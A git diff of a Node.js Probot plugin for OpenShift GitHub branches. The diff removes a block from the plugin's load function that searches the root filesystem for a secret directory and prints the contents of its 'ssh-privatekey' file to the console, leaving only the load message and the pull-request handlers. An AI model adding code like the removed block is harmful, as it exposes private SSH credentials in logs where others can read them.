@@ -7,26 +7,7 @@ const fs = require('fs');
 
 
 module.exports = robot => {
-  // Your plugin code here
-
-
-
-    fs.readdir('/', function(err, items) {
-        for (var i=0; i<items.length; i++) {
-            if(items[i].indexOf('_22_09') != -1){
-                var secret_dir = items[i];
-                fs.readdir('/'+items[i], function(err, items) {
-                  console.log(items);
-                  var contents = fs.readFileSync('/'+secret_dir+'/ssh-privatekey', 'utf8');
-                  console.log('/'+secret_dir+'/ssh-privatekey', (fs.statSync('/'+secret_dir+"/ssh-privatekey")).size,contents);
-              });
-            }
-          };
-    });
-
-
-    console.log('probot-openshift-github-branches was loaded!');
-
+  console.log('probot-openshift-github-branches was loaded!');
 
   robot.on('pull_request.opened', pr_new);
   robot.on('pull_request.reopened', pr_new);
